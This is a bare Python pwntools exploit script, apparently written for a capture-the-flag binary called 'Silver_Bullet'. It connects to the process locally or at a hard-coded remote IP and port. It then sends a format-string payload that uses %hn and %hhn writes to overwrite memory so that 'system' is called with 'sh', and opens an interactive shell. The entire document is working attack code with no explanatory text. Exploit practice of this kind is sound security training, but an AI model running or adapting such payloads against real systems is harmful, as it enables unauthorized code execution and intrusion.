#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./Silver_Bullet')
else:
    s = remote('37.139.17.37', 7331)

elf = ELF('./Silver_Bullet')

system = 0x80486c7
ok = 0x804a02c
sh = 0x804a030

payload = ''
payload += p32(ok)
payload += p32(elf.bss(0x220))
payload += '%{}x'.format(0x100 + 1 - 8)
payload += '%20$hhn'
payload += p32(system)
payload += '%{}x'.format(0x6873 - 0x105)
payload += '%21$hn'
payload += 'A' * 3
payload += p32(sh)
payload += p32(sh + 2)
payload += '%{}x'.format(elf.bss(0x220) % 0x10000 - 0x6873 - 11 + 0x10000)
payload += '%30$hn'
payload += '%{}x'.format(elf.bss(0x220) / 0x10000 - elf.bss(0x220) % 0x10000 + 0x10000)
payload += '%31$hn'
s.send(payload)
s.interactive()
